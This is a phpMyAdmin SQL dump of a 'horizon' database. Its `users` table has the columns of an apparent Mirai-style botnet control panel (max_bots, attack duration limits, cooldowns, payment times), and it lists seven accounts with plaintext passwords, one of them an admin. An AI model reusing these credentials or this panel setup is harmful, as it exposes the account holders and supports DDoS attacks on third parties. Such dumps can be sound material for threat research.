-- phpMyAdmin SQL Dump
-- version 4.0.10.20
-- https://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Mar 18, 2019 at 07:47 PM
-- Server version: 5.1.73
-- PHP Version: 5.3.3

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `horizon`
--

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE IF NOT EXISTS `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=10 ;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `duration_limit`, `cooldown`, `wrc`, `last_paid`, `max_bots`, `admin`, `intvl`, `api_key`) VALUES
(1, 'switch', 'coolhot12', 0, 0, 0, 0, -1, 1, 30, ''),
(2, 'PzYchO', 'Candy777', 120, 30, NULL, 1552433819, -1, 0, 30, NULL),
(4, 'mada2000', 'julian11', 120, 30, NULL, 1552434067, -1, 0, 30, NULL),
(5, 'Demon', 'Lucifer666', 120, 30, NULL, 1552434213, -1, 0, 30, NULL),
(6, 'Lhvz', 'Lhvz123', 120, 30, NULL, 1552476421, -1, 0, 30, NULL),
(9, 'smxcked', 'dynoticxx', 120, 30, NULL, 1552817571, -1, 0, 30, NULL),
(8, 'xVespid', 'DownYou', 120, 30, NULL, 1552661495, -1, 0, 30, NULL);

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
